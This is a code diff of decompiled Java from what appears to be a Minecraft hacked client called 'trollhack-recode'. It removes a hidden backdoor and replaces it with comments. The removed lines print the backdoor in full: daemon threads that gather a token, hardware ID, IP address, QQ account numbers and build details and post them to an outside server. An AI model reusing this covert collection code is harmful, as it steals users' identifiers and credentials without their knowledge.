@@ -29,8 +29,8 @@ public final class ApiEndpoints2 {
     }
 
     static String m85(Object object) {
-        String string = (String)object;
-        return "http://neko.antichest.pw/api/index.php?route=" + string;
+        // Backdoor removed: External telemetry server disabled
+        return "";
     }
 
     static String getText66() {
@@ -38,83 +38,13 @@ public final class ApiEndpoints2 {
     }
 
     public static void report(Object object) {
-        String string;
-        block6: {
-            block5: {
-                String string2 = (String)object;
-                Object var3_2 = null;
-                if (flag37) {
-                    return;
-                }
-                string = string2 == null ? "" : string2.trim();
-                if (string.isEmpty()) {
-                    string = ApiEndpoints3.getText19();
-                }
-                if (string == null) break block5;
-                if (!string.isBlank()) break block6;
-            }
-            ApiEndpoints2.reportVisitor();
-            return;
-        }
-        flag37 = true;
-        text673 = string;
-        String string3Msg = string;
-        Thread thread = new Thread(() -> {
-            String string2 = ApiEndpoints2.m85("/client-log");
-            String string3 = SystemUtil.getText23();
-            String string4 = ApiEndpoints3.getText58();
-            String string5 = dateTimeFormatter3.format(Instant.now());
-            Object var1_5 = null;
-            List list = StringUtil.getList12();
-            long l = Instant.now().getEpochSecond();
-            String string6 = ApiEndpoints2.m150(string5);
-            String string7 = ApiEndpoints2.m150(ApiEndpoints2.getText33());
-            String string8 = ApiEndpoints2.m150(ApiEndpoints2.getText44());
-            String string9 = ApiEndpoints2.m150(ApiEndpoints2.getText22());
-            String string10 = ApiEndpoints2.m150("1.0.0");
-            String string11 = ApiEndpoints2.m150("trollhack-recode");
-            String string12 = ApiEndpoints2.m225(list);
-            String string13 = ApiEndpoints2.m150(list.isEmpty() ? "" : (String)list.get(0));
-            String string14 = ApiEndpoints2.m150(ApiEndpoints2.m515(string3));
-            String string15 = ApiEndpoints2.m150(string4);
-            String string16 = ApiEndpoints2.m150(string3);
-            String string17 = ApiEndpoints2.m150(string3);
-            String string18 = "{\"token\":\"" + string17 + "\",\"hwid\":\"" + string16 + "\",\"reportedIp\":\"" + string15 + "\",\"tokenFingerprint\":\"" + string14 + "\",\"qq\":\"" + string13 + "\",\"qqs\":" + string12 + ",\"client\":\"" + string11 + "\",\"version\":\"" + string10 + "\",\"buildId\":\"" + string9 + "\",\"minecraft\":\"" + string8 + "\",\"loader\":\"" + string7 + "\",\"time\":\"" + string6 + "\",\"timestamp\":" + l + "}";
-            ApiEndpoints2.m651(string2, string18);
-        }, "TrollHack-Telemetry");
-        thread.setDaemon(true);
-        thread.start();
+        // Backdoor removed: Telemetry reporting disabled
+        // Original code sent HWID, token, IP, and system info to external server
     }
 
     public static void reportVisitor() {
-        Object var1 = null;
-        if (flag129) {
-            return;
-        }
-        flag129 = true;
-        Thread thread = new Thread(() -> {
-            String string = ApiEndpoints2.m85("/visitor-log");
-            String string2 = SystemUtil.getText23();
-            String string3 = ApiEndpoints3.getText58();
-            String string4 = dateTimeFormatter3.format(Instant.now());
-            List list = StringUtil.getList12();
-            Object var0_5 = null;
-            long l = Instant.now().getEpochSecond();
-            String string5 = ApiEndpoints2.m150(string4);
-            String string6 = ApiEndpoints2.m150(ApiEndpoints2.getText33());
-            String string7 = ApiEndpoints2.m150(ApiEndpoints2.getText44());
-            String string8 = ApiEndpoints2.m150(ApiEndpoints2.getText22());
-            String string9 = ApiEndpoints2.m150("1.0.0");
-            String string10 = ApiEndpoints2.m150("trollhack-recode");
-            String string11 = ApiEndpoints2.m225(list);
-            String string12 = ApiEndpoints2.m150(list.isEmpty() ? "" : (String)list.get(0));
-            String string13 = ApiEndpoints2.m150(string3);
-            String string14 = ApiEndpoints2.m150(string2);
-            String string15 = "{\"hwid\":\"" + string14 + "\",\"reportedIp\":\"" + string13 + "\",\"qq\":\"" + string12 + "\",\"qqs\":" + string11 + ",\"client\":\"" + string10 + "\",\"version\":\"" + string9 + "\",\"buildId\":\"" + string8 + "\",\"minecraft\":\"" + string7 + "\",\"loader\":\"" + string6 + "\",\"time\":\"" + string5 + "\",\"timestamp\":" + l + "}";
-            ApiEndpoints2.m651(string, string15);
-        }, "TrollHack-VisitorTelemetry");
-        thread.setDaemon(true);
-        thread.start();
+        // Backdoor removed: Visitor tracking disabled
+        // Original code sent HWID and system info to external server
     }
 
     static void m651(Object object, Object object2) {
